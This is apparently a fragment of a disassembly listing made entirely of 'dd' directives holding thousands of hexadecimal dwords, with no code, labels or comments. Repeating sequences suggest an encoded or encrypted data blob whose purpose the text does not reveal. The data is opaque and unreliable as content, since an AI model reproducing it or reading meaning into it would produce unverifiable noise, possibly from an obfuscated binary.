		dd 94050B23h, 0B3A12FC3h, 39EC88BBh, 173CF421h,	791E0B10h
		dd 99CE5F51h, 0B9286875h, 2139EC88h, 45735FFAh,	0B23D70Bh
		dd 2FC39405h, 0D2E37232h, 0AE7B63B6h, 25D94D66h, 5F51792Eh
		dd 687599CEh, 0EC88B928h, 3CF42138h, 1E0B1017h,	0CE5F5179h
		dd 7D0B1697h, 63B641B9h, 4D66AE7Bh, 2344514Ah, 0C394050Bh
		dd 21E1322Fh, 2139ECA6h, 10173CF4h, 53791E0Bh, 46AE3D71h
		dd 88BB2C6Dh, 0F42139ECh
		dd 19736432h, 50BB01Eh,	322AC394h, 0B6D2E372h, 66AE7B63h
		dd 0D7514A4Dh, 0CE5F54E2h, 28687599h, 17EC88B9h, 0C5EE33BBh
		dd 0EA81D9C2h, 9CC968C2h, 0A75D1B79h, 7B632588h, 4F1E76AEh
		dd 0B234451h, 2FC39405h, 41E37232h, 0F421AA12h,	0B10173Ch
		dd 0C456791Eh, 322F500Ch, 25417072h, 0F53DE8F0h, 59786446h
		dd 94059C41h, 77780CC3h, 63B6D2E3h, 4D66AE7Bh, 2344514Ah
		dd 0C097CE98h, 0BC2E514Ch, 0F360E98Bh, 4A4D663Dh, 0B234451h
		dd 2FC39405h, 0DACD4D0Ch, 0AE7B6325h, 1F696E63h, 50B2341h
		dd 322FC394h, 0B6D2E372h, 0C633E8F0h, 3C91F7C1h, 7B80820h
		dd 72322FC3h, 63B6D2E3h, 4D66AE7Bh, 187B6E74h, 0C394050Bh
		dd 0A951116Eh, 7B63B6D7h, 4A4D66AEh, 0B234451h,	0BC509405h
		dd 4170E1A1h, 0AEE8F025h, 514A4D66h, 50B2344h, 322FC394h
		dd 8EEDCD4Ch, 21AE7B63h, 67720B0Bh, 94050B26h, 72322FC3h
		dd 63B6D2E3h, 4D66AE7Bh, 2344514Ah, 0C394050Bh,	0E372322Fh
		dd 7B63B6D2h, 4A4D66AEh, 331C686Fh, 1AF89405h, 0F1A23475h
		dd 0AE7B63B3h, 514A4D66h, 50B2344h, 322FC394h, 0B6D2E372h
		dd 66AE7B63h, 44514A4Dh, 94050B23h, 72322FC3h, 5898FDDDh
		dd 76528E30h, 902167Fh,	0C394050Bh, 0E372322Fh,	7B63B6D2h
		dd 4A4D66AEh, 0B234451h, 2FC39405h, 0D2E37232h,	0AE7B63B6h
		dd 514A4D66h, 24270C7Ah, 615F9B4h, 0A695D649h, 66AE7B63h
		dd 44514A4Dh, 94050B23h, 72322FC3h, 63B6D2E3h, 4D66AE7Bh
		dd 2344514Ah, 0C394050Bh, 0E372322Fh, 5E4CAAECh, 7077468Fh
		dd 0B167F65h, 2FC39405h, 0D2E37232h, 0AE7B63B6h, 514A4D66h
		dd 50B2344h, 322FC394h,	0B6D2E372h, 66AE7B63h, 44514A4Dh
		dd 0B219361Dh, 48120EE6h, 63B6E6D9h, 4D66AE7Bh,	2344514Ah
		dd 0C394050Bh, 0E372322Fh, 7B63B6D2h, 4A4D66AEh, 0B234451h
		dd 2FC39405h, 0D2E37232h, 89675E88h, 716B6840h,	50B237Eh
		dd 322FC394h, 0B6D2E372h, 66AE7B63h, 44514A4Dh,	94050B23h
		dd 72322FC3h, 63B6D2E3h, 4D66AE7Bh, 2344514Ah, 0E1A91935h
		dd 0C2571408h, 7B63B6D2h, 4A4D66AEh, 0B234451h,	2FC39405h
		dd 0D2E37232h, 0AE7B63B6h, 514A4D66h, 50B2344h,	322FC394h
		dd 0B6D2E372h, 4593675Dh, 44776D6Fh, 94050B23h,	72322FC3h
		dd 63B6D2E3h, 4D66AE7Bh, 2344514Ah, 0C394050Bh,	0E372322Fh
		dd 7B63B6D2h, 4A4D66AEh, 0B234451h, 6EDFA83Bh, 0D2E35011h
		dd 0AE7B63B6h, 514A4D66h, 50B2344h, 322FC394h, 0B6D2E372h
		dd 66AE7B63h, 44514A4Dh, 94050B23h, 72322FC3h, 63B6D2E3h
		dd 6A589245h, 23445144h, 0C394050Bh, 0E372322Fh, 7B63B6D2h
		dd 4A4D66AEh, 0B234451h, 2FC39405h, 0D2E37232h,	0AE7B63B6h
		dd 514A4D66h, 50B2344h,	0C11FD94h, 0B6D2E372h, 66AE7B63h
		dd 44514A4Dh, 69050B23h, 8FCFD23Eh, 90B4D01Eh, 0B09B5386h
		dd 0D14653B7h, 3E69F816h, 117030D2h, 869E4BD1h,	0B84F6453h
		dd 0F6DE5953h, 0DDC196F8h, 2F1E7130h, 5C79614Bh, 0AC574F64h
		dd 0F70921B9h, 0CF2CC196h, 44D0E18Fh, 5BAC7961h, 0B65348B0h
		dd 89070921h, 80302D3Eh, 6EB4D0E1h, 0BF64AC86h,	26465348h
		dd 219607F6h, 0E670302Dh, 9961B42Fh, 4B4F64ACh,	0E92146ACh
		dd 2EC19607h, 30E170CFh, 0AD7961B4h, 0B3484F9Bh, 6092146h
		dd 0D02DC169h, 0B4D0E170h, 84AC799Eh, 4653484Fh, 760709DEh
		dd 70302DC1h, 81B4D09Eh, 4F64AC79h, 0C1465337h,	0C1960709h
		dd 1703012h, 7961B4D0h,	0A84F6493h, 9214653h, 0CDC19618h
		dd 0D0E17030h, 4C7961ABh, 53484F64h, 0E7092149h, 302DC196h
		dd 54D0E17Fh, 64AC7961h, 0A6534840h, 96070921h,	90302DCEh
		dd 7EB4D0E1h, 0AF64AC86h, 3E465348h, 219607F6h,	0FF70302Dh
		dd 8961B42Fh, 544F64ACh, 0F921462Ch, 31C18A07h,	28E1704Fh
		dd 94815EB4h, 0AB484F5Bh, 7FF15E46h, 0CE2DC1A9h, 0C4281E70h
		dd 9BAC795Eh, 26ABB7B0h, 6907091Eh, 70C8D23Eh, 9EB4D09Eh
		dd 4F9C5386h, 0DE465337h, 0C16EF8F6h, 1E7030D2h, 78994B2Fh
		dd 0B74F6453h, 0AD9B9ACh, 0D2C196F8h, 0D7198FCFh, 5379614Bh
		dd 5CB0B09Bh, 0F80921B9h, 2FD53E69h, 4BD0E18Fh,	5B54869Eh
		dd 0B95348B0h, 0E9FBF6DEh, 8302D3Eh, 49B4D4AFh,	6F64AC79h
		dd 61465348h, 0C0960709h, 0E170382Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	0AC484F64h
		dd 709DEB9h, 5B2DC196h,	62D08A2Dh, 9BACAFAEh, 0B153B7B4h
		dd 0CC07FED2h, 0BE307798h, 0CCB41657h, 0CB6409E3h, 0CE46202Dh
		dd 4596D9DEh, 9270626Ch, 8661DFB9h, 0BF4F8B47h,	0EE21A1B0h
		dd 0C2C150B9h, 0A3E1AEEBh, 537933F9h, 0B448A887h, 0F0098CE0h
		dd 0CF2D6408h, 5BD03FABh, 93ACC4DBh, 0B9538E8Ch, 4007C7EAh
		dd 8730806Bh, 9EB41E2Ah, 0B0647AAAh, 9C46FEE2h,	6C96838Bh
		dd 92704B54h, 1A618DE8h, 8E4F559Ch, 0BC212532h,	0B9C1CC5Eh
		dd 54E13A79h, 627923F5h, 0CF48240Dh, 6C097317h,	0E62DF8AEh
		dd 6AD09201h, 0B2ACFDE3h, 9853CCCDh, 580785ABh,	0A630A943h
		dd 0B7B45C6Bh, 0B06438EBh, 0DE46E6FEh, 3E96E0EEh, 1E70DFC2h
		dd 8E614327h, 0A74F8B43h, 0B421A1B4h, 0B1C1CC5Ah, 1EE13A7Dh
		dd 97902D1h, 0FE481D31h, 0C1094223h, 852DB2E3h,	53D08A1Dh
		dd 0AAACF5EFh, 0F353C4C1h, 6907725Ch, 8730EB06h, 9EB40636h
		dd 246472A6h, 5A46627Ch, 4D963E35h, 75707268h, 9661C7A5h
		dd 2B4FBA73h, 8D217F6Fh, 0A9C1CC5Ah, 27E11B5Dh,	0F679AF67h
		dd 0BC480529h, 0F009F79Dh, 0DF2D267Dh, 53D03F93h, 3EACAFBAh
		dd 0B9531A1Ah, 6107FEDAh, 0DD30C232h, 0EDB47D4Fh, 0D36430E7h
		dd 0BD46F6EEh, 5D96D9D6h, 4470CFD2h, 0D4614B2Fh, 0FD4F9B53h
		dd 0B421B9ACh, 0EBC169F8h, 1EE18FCFh, 7A799E4Bh, 8D48B09Bh
		dd 0E009DEB9h, 0DF2D3E69h, 43D01E8Fh, 0F0AC869Eh, 0E353B7B4h
		dd 1A07EEC2h, 0E430D236h, 0A7B42F16h, 0C3645382h, 8446ACBBh
		dd 1796F8FEh, 9270CFD6h, 0FD614337h, 0D44F9B43h, 0D721B9A0h
		dd 46C169FCh, 5CE19FEBh, 1799653h, 948B097h, 8309C689h
		dd 852D3E7Dh, 53D01E83h, 1FAC869Ah, 0C253B7A8h,	1A07F6C6h
		dd 0BE30C21Ah, 79B4270Eh, 5647AD7h, 5A468DF6h, 0C196F8EAh
		dd 0E970F6BBh, 71617A4Eh, 584FD93Eh, 192190F5h,	4C12389h
		dd 0F9E1AE82h, 8D79B71Ah, 6248EAE2h, 3609FFF0h,	722D1738h
		dd 0FED03FCAh, 2EAC96A6h, 1C5396F5h, 0E507FEF2h, 0B30D21Eh
		dd 0E5B42F3Eh, 0DB644BB6h, 0BD46A497h, 0C196E8D2h, 0E970FEB7h
		dd 7161624Eh, 404FB20Eh, 192188C9h, 35C15899h, 0C8E1AE9Ah
		dd 0B479B712h, 7248E2E2h, 2609F7E0h, 112D0F34h,	9DD027EAh
		dd 55ACBFFFh, 7753AFF9h, 0AF07C787h, 5930F373h,	0AB44498h
		dd 2C6453AEh, 52468DF6h, 0BA96F8D2h, 9270CFF6h,	2616A13h
		dd 0CC4F8367h, 0AC21A980h, 80C169E0h, 65E187D3h, 43799E5Fh
		dd 7248B09Fh, 2E09FFECh, 722D2624h, 0E6D00ECEh,	36AC8EA6h
		dd 1C5396F9h, 0E507EE9Fh, 0F430D216h, 0FDB42F3Ah, 9964539Ah
		dd 6B46ACBBh, 8B96F0CAh, 8270DF93h, 12614B1Fh, 334F9B7Fh
		dd 9521B984h, 77C161DCh, 0B3E18FF7h, 38799E7Fh,	0DF48B0BFh
		dd 9309CE89h, 0AC2D3641h, 72D01EAFh, 83AC8E86h,	2D53B7B8h
		dd 4807F6EAh, 1330D232h, 0B7B44463h, 89645396h,	0CE46B49Fh
		dd 2696F8FEh, 1670C7C2h, 0CC614B2Bh, 0B74FAA12h, 921B9ACh
		dd 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 63B4D0E1h, 4D66AE7Bh, 2344514Ah
		dd 0C394050Bh, 0E372322Fh, 7B63B6D2h, 4A4D66AEh, 0B234451h
		dd 2FC39405h, 70E37232h, 0CD9C114h, 514A4D66h, 50B2344h
		dd 322FC394h, 0B6D2E372h, 66AE7B63h, 44514A4Dh,	0F960B23h
		dd 0D0B5AF42h, 0C1147041h, 4D66AE7Bh, 2344514Ah, 0C394050Bh
		dd 0E372322Fh, 7B63B6D2h, 0D1DE66AEh, 94AAE790h, 8D5903ABh
		dd 7041D090h, 0AE7B63B6h, 514A4D66h, 50B2344h, 322FC394h
		dd 3741E372h, 0C70FDD1Bh, 0CFEBEBECh, 368588BCh, 0D0908D61h
		dd 63B6D2E3h, 4D66AE7Bh, 2344514Ah, 7630960Bh, 6CFD4288h
		dd 0F4EC395Dh, 0C3ECE921h, 8CA3EACEh, 2F6136A7h, 0D2E37232h
		dd 0AE7B63B6h, 0E0EADE66h, 7A7494DFh, 4D50BCEBh, 0C9AD9C0Dh
		dd 0EFD1041Ch, 0E6C6CBC6h, 94050B23h, 72322FC3h, 0DB0541E3h
		dd 3B10D6F8h, 5532273Ch, 0B5E2737Dh, 95044459h,	0F9C0C0A4h
		dd 4A4D660Ch, 0B234451h, 97700705h, 0BD94FE9Ch,	0D8140CD9h
		dd 0F2E9FDDEh, 737193E7h, 0AD8CACFBh, 0B6D2E3D0h, 66AE7B63h
		dd 0F5E2D94Dh, 0FF6C8E8Fh, 0C94744A8h, 51A4D871h, 0C3DBA471h
		dd 46E73A21h, 0C394A78Bh, 0E372322Fh, 0C7D025D2h, 2F8AF21Ah
		dd 19E12B34h, 6FD7D41Eh, 0D8A14101h, 0F7CB06C3h, 514AEFE7h
		dd 50B2344h, 839C5094h,	0EF6F7CDFh, 29BC0405h, 0B03051Fh
		dd 8A094B30h, 2C934AC9h, 63145590h, 4D66AE7Bh, 9FF7C24Ah
		dd 0A111A8B4h, 0A63DF875h, 3E26FB9Fh, 460D29E1h, 5782F263h
		dd 2F61ED59h, 0D2E37232h, 1FC8F0B6h, 96C98BDDh,	32463018h
		dd 563F5D8h, 85C1AC37h,	3A0F6177h, 0E6F33111h, 94050B23h
		dd 0CE81BCC3h, 0F81B7140h, 4A1E05F7h, 1540604Dh, 83DB403Ch
		dd 81D42831h, 0D9FBD4B0h, 4A4D66AEh, 6790D751h,	8E4C1B8Ah
		dd 4E27EEBBh, 0A9D0C333h, 1118082Ah, 66AD395Ah,	908BA0F7h
		dd 0B6D2E3D0h, 0D00EE863h, 3E2B3037h, 0D62E8759h, 0E080E5F3h
		dd 77E49ED2h, 2DD7B43Bh, 0BA2D312Ah, 0C39405A9h, 8FB0A12Fh
		dd 1008DDB9h, 64830DC5h, 9539775Dh, 0E80329A1h,	0B39BBB35h
		dd 91A02D7h, 514AEFC4h,	6DA0B044h, 5449A5F2h, 24B48514h
		dd 4E80535Fh, 0C3E38E45h, 18988EBDh, 0B99BEF7Eh, 63B67064h
		dd 15DF3D7Bh, 791E0B10h, 99CE5F51h, 0B6275E75h,	3339ECB5h
		dd 0D9DD6986h, 98B0D7C2h, 2FC3369Ch, 8B48E132h,	0F42139ECh
		dd 910173Ch, 5F51791Ch,	797599CEh, 0B641EB5Fh, 66AE7B63h
		dd 44514A4Dh, 0E0960B23h, 28687599h, 0A3E988B9h, 20126ED0h
		dd 68340E16h, 0C3070A26h, 0E373322Fh, 7B63B6D2h, 0E1DE66AEh
		dd 51791D0Dh, 0B102CC5Fh, 4170E1A4h, 0E5E8F025h, 514A4271h
		dd 0A0E0044h, 322FC394h, 25D2E372h, 65AD78F1h, 0D7E32B2Dh
		dd 94050B23h, 39322FC3h, 63B6DDF4h, 5D2C8D6Bh, 2344514Ah
		dd 0C394050Bh, 70E1A1BCh, 7BF02541h, 4A4D66AEh,	40234451h
		dd 17C3DC12h, 0C2C03315h, 0AE7B63B6h, 514A4D66h, 50B2344h
		dd 322FC394h, 0B6D2E372h, 2DAE7B63h, 7F69725Bh,	84442C05h
		dd 72322FC3h, 63B6D2E3h, 4D66AE7Bh, 2344514Ah, 0C394050Bh
		dd 0A872322Fh, 5B5997C5h, 4A5D4095h, 0B234451h,	2FC39405h
		dd 0D2E37232h, 0AE7B63B6h, 514A4D66h, 4E0B2344h, 80EF68Ch
		dd 0B6D2D852h, 66AE7B63h, 44514A4Dh, 94050B23h,	72322FC3h
		dd 63B6D2E3h, 666AE7Bh,	2717652h, 0C3940531h, 0E372322Fh
		dd 7B63B6D2h, 4A4D66AEh, 0B234451h, 2FC39405h, 99E37232h
		dd 9B5C22A0h, 514A4D66h, 50B2344h, 322FC394h, 0B6D2E372h
		dd 66AE7B63h, 44514A4Dh, 0DF050B23h, 72106ED5h,	63B6D2E3h
		dd 4D66AE7Bh, 2344514Ah, 0C394050Bh, 0E372322Fh, 7B63B6D2h
		dd 14D66AEh, 0B230F1Ah,	2FC39405h, 2FE37232h, 5C869E4Bh
		dd 0B3B7B01Bh, 0E7F6DE41h, 0D0D2BE96h, 742FE670h, 0A4537961h
		dd 862C484Fh, 56380921h, 0B00F2DC1h, 0A1ABD0E1h, 8F7BAC79h
		dd 0E1495348h, 1990709h, 2177302Dh, 0B966B4D0h,	884C64ACh
		dd 0C9224653h, 0EDC09607h, 10E07030h, 6C7861B4h, 0B3B74F64h
		dd 0E7E62146h, 0C0EAC096h, 4C571077h, 9BAB886Eh, 0B954B8B0h
		dd 6908F9DEh, 8F2FDD3Eh, 9E8B201Eh, 0B01B5C86h,	0DEB9A3B7h
		dd 0E169F6F6h, 0C970347Ah, 6161B4D0h, 784F64ACh, 8214653h
		dd 2DC19E07h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 9BAC7961h, 4653B7B0h,	0FD070921h
		dd 0A630469Ch, 9EB4062Eh, 0B8645382h, 7B46A4BBh, 0F965D50h
		dd 4C70F69Bh, 0FD61114Ah, 0A74F17C9h, 8D219884h, 5EC1C446h
		dd 2FE11B59h, 5B798E5Fh, 0B448A887h, 0E809E7F8h, 432D1F4Dh
		dd 4BD0B33Dh, 83AC9E82h, 0B153E5E9h, 6907ACBFh,	9F30F31Ah
		dd 96B46D5Bh, 0B0646ABAh, 0F7469D83h, 3696AAA3h, 1E70FEE6h
		dd 86616203h, 0F54FC906h, 0A421C2D1h, 5EC1ED7Eh, 0B3E14908h
		dd 6A795084h, 0E6482C05h, 93097B1Fh, 0B42D8BDFh, 7AD0A331h
		dd 0F8AC1208h, 2D531A1Eh, 40073019h, 0AE305EB0h, 0B7B45463h
		dd 916428FBh, 0EF46DFC2h, 1796838Bh, 3770BCA7h,	86612042h
		dd 0B74FD11Ah, 0F621A1B4h, 0D2C179E8h, 27E187C7h, 43798E5Bh
		dd 0EE48A883h, 9B097B1Bh, 0FE2D8BDBh, 11D08215h, 0C9AC2B34h
		dd 80532B2Ah, 23077A54h, 973046ACh, 0AFB45C6Fh,	0FA6420F7h
		dd 0DE462835h, 3696C1CEh, 1E70E6FAh, 12616A0Fh,	334F5598h
		dd 85217F6Fh, 0B9C1D442h, 3FE10345h, 0CF79BF6Bh, 0D7487658h
		dd 83097B1Bh, 0C72DAAFBh, 0EED02FA3h, 8BAC332Ch, 0B1539E94h
		dd 7907EECAh, 9730F322h, 3BB4063Ah, 0B064FE2Ch,	0D646A4B3h
		dd 6C96E8FAh, 6D709D83h, 0E561284Eh, 0D44FC10Ah, 9521988Ch
		dd 88C169F8h, 7DE18FCFh, 19799E4Bh, 0EE48B09Bh,	0C109DEB9h
		dd 0FE2D3E69h, 62D01E8Fh, 0BAAC869Eh, 0A153B7B0h, 7907F6DEh
		dd 8730D23Eh, 0F5B42F1Eh, 0EA645382h, 0AD46B4ABh, 5596F8FEh
		dd 2770CFDAh, 0F5614B2Bh, 0ED4F9B5Fh, 0DF21B9A4h, 5EC169FCh
		dd 54E187D7h, 30799E5Bh, 8D48B097h, 6C09DEBDh, 0BC2D2E4Dh
		dd 19D01697h, 3EAC8692h, 0C253AF80h, 2307F6CAh,	9730D232h
		dd 1AB42F1Ah, 0CB64539Eh, 0AD46ACAFh, 0F96E8D2h, 0F970C7C2h
		dd 3361627Eh, 334FBA12h, 921B9B0h, 25C15091h, 0D8E1BEAEh
		dd 0BC79DC26h, 434899C2h, 2E0994C8h, 192D1F24h,	95D037DEh
		dd 55ACDCE7h, 775396F9h, 0D407DF8Fh, 3A30F37Bh,	2BB43F26h
		dd 156472C3h, 5246A49Bh, 0BA96F8D6h, 6570CFF2h,	0ED61531Fh
		dd 0D44F9373h, 921A988h, 25C1589Dh, 0D8E1A6AEh,	0A479B716h
		dd 434881FEh, 1F09EFD8h, 282D1F3Ch, 0ACD037D6h,	45ACD4E7h
		dd 67539EE9h, 0B707C783h, 5930EB5Bh, 50B4167Fh,	7E644BCFh
		dd 18469DEEh, 0E896D9BBh, 8A70A454h, 1A614B07h,	3B4FBA12h
		dd 7221B988h, 5EC169DCh
		dd 0ABE1AEF3h, 2879867Fh, 0F648A0B7h, 0AA09DEA1h, 852D3675h
		dd 5BD01E9Bh, 45AC869Ah, 6F5396E5h, 0D407EE93h,	2230C27Fh
		dd 33B42726h, 156472CFh, 5246B4F6h, 4596F8DEh, 7D70CFF6h
		dd 0AF614B33h, 24F9B5Fh, 4321B190h, 4EC179B9h, 0BBE18FFFh
		dd 0D7799E67h, 0CF48B0B3h, 5D09D69Dh, 532D3E51h, 20D01EBBh
		dd 0E8AC86BAh, 0D253A780h, 0A07FEF6h, 0B630D21Eh, 86B42706h
		dd 2464538Eh, 0FF46AC83h, 0A296F8FAh, 3770A4AFh, 0BF614B3Fh
		dd 0A74F837Bh, 0EE21B9A4h, 0DAC161E8h, 65E18FCBh, 5379AF0Ah
		dd 5348B09Bh, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E370302Dh, 0D9C114D2h, 4A4D660Ch, 0B234451h, 2FC39405h
		dd 0D2E37232h, 0AE7B63B6h, 0C8D33066h, 0A7A981DEh, 322FC336h
		dd 0B6D2E372h, 66AE7B63h, 44514A4Dh, 2AC59823h,	0EBABAB48h
		dd 0C1147079h, 4D66AED9h, 2344514Ah, 0C394050Bh, 99B2A12Fh
		dd 0D8C2395Dh, 0D4D3EC27h, 0A981E6CFh, 2FC394A7h, 0D2E37232h
		dd 0DEDFE925h, 2E3532E8h, 8B74593Bh, 0A8B376E6h, 0B6D241F5h
		dd 66AE7B63h, 33D9FFDEh, 0E2737D56h, 7475AB6h, 1CDDB98Ch
		dd 4D660CE3h, 2344514Ah, 683BBA98h, 6D19594Ah, 0C6AD0B6Ah
		dd 3C29131Eh, 0B81C323h, 2FC39405h, 777CC9A1h, 3C0407EFh
		dd 4F54567Ch, 6A7EED5Eh, 328D5AF8h, 0B6D2E372h,	0D51ABDF0h
		dd 5D362512h, 0D44A4E6Ch, 7F831CFh, 0C12F77BBh,	4D66AE7Bh
		dd 0BCFEE9D9h, 8ED75CCBh, 0AC3F0518h, 0F67ABAC1h, 0E8EA39D9h
		dd 0B234451h, 82732596h, 1A9BD981h, 0E34D52B2h,	36515C29h
		dd 9BAB4033h, 322FC336h, 0C95D55E1h, 0C1F9F0C0h, 7799F7C1h
		dd 3F1E4B6Ch, 0D2854F03h, 63B6D241h, 3B1004E8h,	1C8A3E25h
		dd 433CF3Dh, 9B630118h,	0DB60B5BBh, 4A4DC437h, 6E471DC2h
		dd 0E1A7F160h, 16FF6524h, 3CDCC411h, 91838ACDh,	50B8180h
		dd 68499C07h, 0D088B928h, 33602E06h, 0D769013Eh, 79698B0h
		dd 72322F50h, 39D08E70h, 273CF421h, 7B1D0814h, 50AA3B50h
		dd 0E372322Fh, 7B63B6D2h, 1112F43Dh, 0AC7F1E0Ah, 0BC500796h
		dd 0AEDA6FA1h, 0E03563B6h, 514A4D66h, 0AE99B044h, 0A1489F3Ch
		dd 0B6D2E372h, 66864563h, 0E725A4Dh, 94050B23h,	0E1A12FC3h
		dd 63254170h, 4D66AE7Bh, 6D6A6F4Ah, 89D52240h, 0E372322Fh
		dd 7B63B6D2h, 4A4D66AEh, 0B234451h, 14ECAA05h, 99C44912h
		dd 0AE7B63B6h, 514A4D66h, 50B2344h, 322FC394h, 8DFDDD72h
		dd 66E54159h, 44514A4Dh, 94050B23h, 72322FC3h, 63B6D2E3h
		dd 6A49907Bh, 23441A71h, 0C394050Bh, 0E372322Fh, 7B63B6D2h
		dd 4A4D66AEh, 280C7A51h, 2FC3944Eh, 0D2E37232h,	0AE7B63B6h
		dd 514A4D66h, 50B2344h,	7911FD94h, 0B6D2E372h, 0A7AE7B63h
		dd 86FAB7B0h, 5663F61Eh, 0B054D2C2h, 0E198EFE1h, 0CFD4B379h
		dd 0A1D94C48h, 413D0809h, 61723F2Dh, 0F9DAB3D0h, 0C81763ACh
		dd 89794553h, 0AD969507h, 50B97130h, 2CEB60B4h,	0D3D94C64h
		dd 870B5E46h, 0F084A696h, 5488260Ch, 9BF47E9Dh,	0B90B4FB3h
		dd 695F06DDh, 8FA1323Dh, 9EB6EF1Dh, 0A766D385h,	9465715h
		dd 0D1960709h, 0C170302Dh, 7861B4D0h, 484F6CACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 0CF2DC196h, 0B4D01E8Fh, 0FAC7961h, 90532312h, 6907DFEEh
		dd 8730D23Ah, 3BB42712h, 8164F620h, 8C4695FEh, 4596A293h
		dd 0E704348h, 0FD616A07h, 3B4F36EDh, 0F6212D3Ah, 0DAC179ECh
		dd 37E197D3h, 4379A70Ah, 204891BFh, 0F809730Bh,	0D72D2675h
		dd 43D04CD6h, 9BACDCFFh, 0A9539694h, 6107B49Bh,	8F30EB02h
		dd 0B7B41E2Ah, 0B86401D3h, 0DE469D83h, 3E96D1DAh, 5C709D87h
		dd 0D4613052h, 3B4F1FD5h, 6A217F6Bh, 0EBC1A737h, 65E11351h
		dd 38793BEDh, 0D748052Dh, 0C9096307h, 0AC2DAAFFh, 0DFD0B321h
		dd 0B2AC4059h, 98533B3Eh, 40078DA3h, 0AE30A943h, 0AFB45C6Bh
		dd 996428FBh, 0F746DFC2h, 3E96939Bh, 1E70859Bh,	86615337h
		dd 0B74F8B43h, 0FE21B1A4h, 0C2C179E8h, 6DE197D7h, 30793BE9h
		dd 9D480529h, 0A2094223h, 9D2D93C3h, 72D08215h,	0D1AC0A14h
		dd 0A1532322h, 580785AFh, 0C530A14Fh, 9EB4AB9Ch, 0B8646ABEh
		dd 0DE46859Fh, 0AA96D9D6h, 9A700119h, 0F5618DECh, 0DC4F26E9h
		dd 0E6213526h, 4EC148D8h, 54E1490Ch, 28793BE9h,	0A4482409h
		dd 5D09EF95h, 0DF2D8BDBh, 43D037ABh, 8BAC9E8Ah,	0A15396ACh
		dd 0CC07DFFAh, 8F307F94h, 96B4271Ah, 0E264438Ah, 0AD46FEE6h
		dd 5D969B97h, 7D70958Bh, 0E5616A0Fh, 0ED4F9B53h, 0A421B9ACh
		dd 98C169F8h, 6DE18FCFh, 6A799E4Bh, 9D48B09Bh, 0D109DEB9h
		dd 0EE2D3E69h, 53D01E8Fh, 8BAC869Eh, 0B153B7B0h, 207F6DEh
		dd 0D530D23Ah, 0EDB43702h, 0DB64538Eh, 0E746ACBFh, 4D96F8F2h
		dd 4470CFDEh, 0AF614B27h, 3B4F9B57h, 8D21B1B4h,	0B1C169E8h
		dd 0EE18FC3h, 0C7799E4Fh, 0DF48A0BFh, 0AA09D6A1h, 6A2D3E65h
		dd 30D006BFh, 0D1AC868Ah, 0A153B7BCh, 0ED07F6DAh, 0F430D226h
		dd 0EDB42F06h, 816443A2h, 3946A4A7h, 8B96D1A7h,	9A70EE93h
		dd 79614B33h, 404FA23Ah, 12188CDh, 3DC12B95h, 0C0E1A696h
		dd 8579D43Ah, 7A4891D6h, 2609F7E8h, 12D6410h, 85D03FC6h
		dd 26ACAFCFh, 0C5396F5h, 0DC07E6E6h, 2A30F37Bh,	12B42732h
		dd 346453A6h, 0A546AC97h, 5596E0C6h, 7D70C7F2h,	79615B0Bh
		dd 404FAA36h, 12190CDh,	25C140A5h, 0C0E1BEAAh, 0B479AF2Ah
		dd 4B4891CEh, 1F09F7E0h, 112D6C10h, 95D037D6h, 45ACB7C3h
		dd 6F538ED5h, 0A707CFBFh, 4130CA77h, 58B41E47h,	666472CBh
		dd 4A46C731h, 0A296F8DEh, 9270EE93h, 2614B0Bh, 3B4F9B77h
		dd 72219890h, 0A9C171CCh, 75E19FE3h, 1799E53h, 0E648B887h
		dd 0E809DEADh, 112D3E6Dh, 9DD03FDAh, 26AC9ED3h,	1453A7F1h
		dd 0C407FEE6h, 2A30F377h, 12B4375Fh, 0CB6453AEh, 0BD46AC93h
		dd 1796F8EAh, 0AB70CFDEh, 33614313h, 2B4F8B12h,	6221B99Ch
		dd 56C169D4h, 4CE18FE7h, 0F679966Fh, 3048B0A3h,	9309DE8Dh
		dd 0BC2D3E4Dh, 20D00EBFh, 0F8AC8EB6h, 8053B790h, 7107FEC6h
		dd 1B30D236h, 0BFB42F2Ah, 2C64538Ah, 0F746C7CAh, 796F8E6h
		dd 0E70D7FAh, 9E614B27h, 0BF4F9343h, 0BC21B9A8h, 0D2C158B9h
		dd 0D0E18FCFh, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
